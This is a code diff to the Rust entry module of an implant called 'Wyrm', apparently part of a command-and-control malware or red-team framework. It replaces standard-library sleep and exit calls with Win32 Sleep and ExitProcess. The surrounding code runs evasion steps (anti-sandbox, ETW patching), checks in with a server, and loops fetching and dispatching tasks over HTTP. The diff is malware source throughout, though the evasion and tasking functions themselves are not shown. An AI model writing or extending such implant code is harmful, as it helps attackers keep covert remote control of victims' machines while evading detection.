@@ -1,10 +1,12 @@
 //! Entry module for kicking off the implant, whether from a DLL or an exe.
 
-use std::{sync::atomic::AtomicBool, thread::sleep, time::Duration};
+use core::{sync::atomic::AtomicBool, time::Duration};
+use std::sync::atomic::Ordering;
 
 #[cfg(debug_assertions)]
 use shared::pretty_print::print_failed;
 use shared::pretty_print::print_info;
+use windows_sys::Win32::System::Threading::{ExitProcess, Sleep};
 
 use crate::{
     anti_sandbox::anti_sandbox,
@@ -17,11 +19,12 @@ use crate::{
 /// Determines whether the agent is built as a service, or not
 pub static IS_IMPLANT_SVC: AtomicBool = AtomicBool::new(false);
 /// Is the application currently running - this will be set to false when the exit command is given.
-pub static APPLICATION_RUNNING: AtomicBool = AtomicBool::new(true);
+pub static APPLICATION_RUNNING: AtomicBool = AtomicBool::new(false);
 
 /// Literally just the entry function into the payload allowing flexibility to call from either
 /// an exe, or dll
 pub fn start_wyrm() {
+    APPLICATION_RUNNING.store(true, Ordering::SeqCst);
     init_agent_console();
 
     #[cfg(debug_assertions)]
@@ -30,14 +33,24 @@ pub fn start_wyrm() {
     // Do the anti-sandbox, etw patching, etc.. before we jump into the implant loop.
     on_start_evasion();
 
+    //
+    // Initialise the implant
+    //
     let mut implant = Wyrm::new();
+
+    //
+    // Enter the core loop
+    //
     first_check_in(&mut implant);
 
     loop {
         implant.get_tasks_http();
         implant.dispatch_tasks();
 
-        sleep(Duration::from_secs(calculate_sleep_seconds(&implant)));
+        let t = Duration::from_secs(calculate_sleep_seconds(&implant)).as_millis() as u32;
+        unsafe {
+            Sleep(t);
+        }
     }
 }
 
@@ -73,12 +86,13 @@ pub fn first_check_in(implant: &mut Wyrm) {
                 if attempt == implant.first_connection_retries.num_retries {
                     #[cfg(debug_assertions)]
                     print_failed("Max first connection retries reached. Exiting.");
-                    std::process::exit(0);
+                    unsafe { ExitProcess(0) };
                 }
 
-                std::thread::sleep(Duration::from_secs(
-                    implant.first_connection_retries.failed_first_conn_sleep,
-                ));
+                let t =
+                    Duration::from_secs(implant.first_connection_retries.failed_first_conn_sleep)
+                        .as_millis();
+                unsafe { Sleep(t as u32) };
                 continue;
             }
         };
